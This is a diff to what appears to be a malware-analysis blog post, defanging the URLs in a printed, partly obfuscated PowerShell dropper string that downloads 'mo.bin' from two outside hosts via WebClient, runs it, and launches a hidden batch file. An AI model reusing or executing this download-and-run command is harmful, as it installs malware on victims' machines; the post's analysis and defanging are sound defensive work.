@@ -239,7 +239,7 @@ console.log(text);
 {% highlight bash %}
 md|/c|powershell|"'powershell|""function|-wurmxdpnt)string]|q-xqdx$(newqobject|system.net.webclient
 [.downloadfile(q-xqdx''qtmpq;-hrsiaabbexe''[,startqprocess|''qtmpq;-hrsiaabbexe'',{try$-wurmxdpnt''
-http://sabarasourcing.com/mo.bin''[{catch$-wurmxdpnt''http://ayuhas.co.in/mo.bin''
+hXXp://sabarasourcing[.]com/mo.bin''[{catch$-wurmxdpnt''hXXp://ayuhas[.]co.in/mo.bin''
 [{'""|_|outqfile|qencoding|ascii|qfilepath|qtmpq;-wfebswjqbat,|startqprocess|'qtmpq;-wfebswjqbat'|qwindowstyle|hidden"-
 {% endhighlight %}
 
